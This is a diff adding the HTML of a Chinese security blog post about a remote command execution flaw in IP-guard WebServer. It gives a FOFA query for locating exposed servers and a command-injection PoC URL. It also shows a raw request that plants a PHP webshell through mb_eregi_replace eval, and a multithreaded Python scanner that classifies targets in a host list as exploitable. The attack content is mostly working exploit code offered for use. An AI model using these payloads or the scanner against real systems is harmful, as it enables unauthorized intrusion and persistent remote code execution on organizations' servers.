@@ -1,0 +1,708 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://raw.githubusercontent.com/gh0stNinja/images/main/favicon.ico">
+  <link rel="icon" href="https://raw.githubusercontent.com/gh0stNinja/images/main/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Ninja">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="IP-guard WebServer 远程命令执行漏洞IP-guard是由溢信科技股份有限公司开发的一款终端安全管理软件，旨在帮助企业保护终端设备安全、数据安全、管理网络使用和简化IT系统管理。 影响版本1&lt; IP-guard WebServer 4.81.0307.0  fofa1&quot;IP-guard&quot; &amp;&amp; icon_hash&#x3D;&quot;2030860">
+<meta property="og:type" content="article">
+<meta property="og:title" content="-- coding_utf-8 --">
+<meta property="og:url" content="http://example.com/1970/01/01/POC/IP-guard%20WebServer%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Ninja&#39;s blog - 学与用">
+<meta property="og:description" content="IP-guard WebServer 远程命令执行漏洞IP-guard是由溢信科技股份有限公司开发的一款终端安全管理软件，旨在帮助企业保护终端设备安全、数据安全、管理网络使用和简化IT系统管理。 影响版本1&lt; IP-guard WebServer 4.81.0307.0  fofa1&quot;IP-guard&quot; &amp;&amp; icon_hash&#x3D;&quot;2030860">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/assets/20231109165256.png">
+<meta property="og:image" content="http://example.com/assets/20231109165333.png">
+<meta property="article:published_time" content="1970-01-01T00:00:00.000Z">
+<meta property="article:modified_time" content="2024-08-27T02:41:20.732Z">
+<meta property="article:author" content="Ninja">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/assets/20231109165256.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>-- coding_utf-8 -- - Ninja&#39;s blog - 学与用</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":2},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Ninja&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-th-large"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/" target="_self">
+                <i class="iconfont icon-book"></i>
+                <span>漏洞知识库</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-codeforces"></i>
+                <span>在线工具</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="https://hack.chat" target="_self">
+                    
+                    <span>Hack.chat私密频道</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="https://git.io/linux" target="_self">
+                    
+                    <span>Linux命令大全</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="https://xssaq.com" target="_self">
+                    
+                    <span>XSS平台</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="-- coding_utf-8 --"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="1970-01-01 08:00" pubdate>
+          1970年1月1日 早上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          511 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          5 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">-- coding_utf-8 --</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="IP-guard-WebServer-远程命令执行漏洞"><a href="#IP-guard-WebServer-远程命令执行漏洞" class="headerlink" title="IP-guard WebServer 远程命令执行漏洞"></a>IP-guard WebServer 远程命令执行漏洞</h2><p>IP-guard是由溢信科技股份有限公司开发的一款终端安全管理软件，旨在帮助企业保护终端设备安全、数据安全、管理网络使用和简化IT系统管理。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">&lt; <span class="hljs-built_in">IP</span>-guard WebServer <span class="hljs-number">4</span>.<span class="hljs-number">81</span>.<span class="hljs-number">0307</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="fofa"><a href="#fofa" class="headerlink" title="fofa"></a>fofa</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-string">&quot;IP-guard&quot;</span> &amp;&amp; <span class="hljs-attribute">icon_hash</span>=<span class="hljs-string">&quot;2030860561&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-keyword">/ipg/</span>static<span class="hljs-keyword">/appr/</span>lib<span class="hljs-keyword">/flexpaper/</span>php/view.php?<span class="hljs-attr">doc</span><span class="hljs-operator">=</span><span class="hljs-number">11.</span>jpg<span class="hljs-variable">&amp;format</span>=swf<span class="hljs-variable">&amp;</span>isS<span class="hljs-attr">plit</span><span class="hljs-operator">=</span>true<span class="hljs-variable">&amp;page</span>=||ping%<span class="hljs-number">20</span>dnslog<br></code></pre></td></tr></table></figure>
+
+<h2 id="写php"><a href="#写php" class="headerlink" title="写php"></a>写php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">GET /ipg/<span class="hljs-built_in">static</span>/appr/lib/flexpaper/php/view.php?doc=<span class="hljs-number">1</span>.jpg&amp;format=swf&amp;isSplit=<span class="hljs-literal">true</span>&amp;page=||<span class="hljs-keyword">echo</span>+^<span class="hljs-meta">&lt;?php</span>+@<span class="hljs-title function_ invoke__">mb_eregi_replace</span>(<span class="hljs-string">&#x27;.*&#x27;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>],<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;ee&#x27;</span>);?^&gt;+&gt;<span class="hljs-number">1</span>.php HTTP/<span class="hljs-number">1.1</span><br>Host: your-ip<br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Macintosh; Intel Mac OS X <span class="hljs-number">10_15_7</span>) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">119.0</span>.<span class="hljs-number">0.0</span> Safari/<span class="hljs-number">537.36</span><br>Accept: *<span class="hljs-comment">/*</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.9</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><img src="/./assets/20231109165256.png" srcset="/img/loading.gif" lazyload><br><img src="/./assets/20231109165333.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Python脚本"><a href="#Python脚本" class="headerlink" title="Python脚本"></a>Python脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><span class="hljs-comment"># author:MDSEC</span><br><span class="hljs-comment"># from:https://github.com/MD-SEC/MDPOCS</span><br><span class="hljs-comment"># fofa:&quot;IP-guard&quot; &amp;&amp; icon_hash=&quot;2030860561&quot;</span><br><span class="hljs-comment"># </span><br><br><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> csv<br><span class="hljs-keyword">import</span> urllib3<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">2</span>:<br>    <span class="hljs-built_in">print</span>(<br>        <span class="hljs-string">&#x27;+----------------------------------------------------------------------------------------------------------+&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<br>        <span class="hljs-string">&#x27;+ DES: by MDSEC as https://github.com/MD-SEC/MDPOCS                                                        +&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<br>        <span class="hljs-string">&#x27;+-------------------------------------------------------------------------------------------------- -------+&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<br>        <span class="hljs-string">&#x27;+ USE: python3 &lt;filename&gt; &lt;hosts.txt&gt;                                                                       +&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<br>        <span class="hljs-string">&#x27;+ EXP: python3 Ip_Guard_Webserver_View_Rce_Poc.py url.txt                                                  +&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<br>        <span class="hljs-string">&#x27;+-------------------------------------------------------------------------------------------------- --------+&#x27;</span>)<br>    sys.exit()<br>proxysdata = &#123;<br><span class="hljs-string">&#x27;http&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1:8080&#x27;</span><br>&#125; <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">poc</span>(<span class="hljs-params">host</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;http&quot;</span> <span class="hljs-keyword">in</span> host:<br>        url = host<br>    <span class="hljs-keyword">else</span>:<br>        url =<span class="hljs-string">&quot;http://&quot;</span>+host<br>    host1=url.replace(<span class="hljs-string">&quot;http://&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<br>    host2=host1.replace(<span class="hljs-string">&quot;https://&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<br>    headers = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0&quot;</span>,<br>        <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;</span>,<br>        <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,<br>        <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate, br&quot;</span>,<br>        <span class="hljs-string">&quot;Host&quot;</span>:<span class="hljs-string">&quot;%s&quot;</span> % host2<br>    &#125;<br>    vulurl = url + <span class="hljs-string">&quot;/ipg/static/appr/lib/flexpaper/php/view.php?doc=11.jpg&amp;format=swf&amp;isSplit=true&amp;page=||ping%20www.baidu.com&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        start_time = time.time()<br>        r = requests.get(vulurl, headers=headers)<br>        end_time = time.time()<br>        response_time = end_time - start_time<br>        <span class="hljs-keyword">if</span> r.status_code==<span class="hljs-number">200</span> <span class="hljs-keyword">and</span> response_time &gt;<span class="hljs-number">2</span> <span class="hljs-keyword">and</span> response_time&lt;<span class="hljs-number">6</span> :<br>            <span class="hljs-built_in">print</span>(host+<span class="hljs-string">&quot; :一定能打&quot;</span>)<br>        <span class="hljs-keyword">elif</span> r.status_code==<span class="hljs-number">200</span>:   <br>            <span class="hljs-built_in">print</span>(host+<span class="hljs-string">&quot; :大概率能打&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(host+<span class="hljs-string">&quot; :不能打&quot;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>        <span class="hljs-built_in">print</span> (host+<span class="hljs-string">&quot;:false&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    file = sys.argv[<span class="hljs-number">1</span>]<br>    data = <span class="hljs-built_in">open</span>(file)<br>    reader = csv.reader(data)<br>    <span class="hljs-keyword">with</span> ThreadPoolExecutor(<span class="hljs-number">50</span>) <span class="hljs-keyword">as</span> pool:<br>        <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> reader:<br>            pool.submit(poc, row[<span class="hljs-number">0</span>])<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/" class="category-chain-item">漏洞知识库</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/1970/01/01/POC/HiKVISION%20%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" title="fofa">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">fofa</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/1970/01/01/POC/IDocView_qJvqhFt%E6%8E%A5%E5%8F%A3%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" title="IDocView_qJvqhFt接口任意文件读取">
+                        <span class="hidden-mobile">IDocView_qJvqhFt接口任意文件读取</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
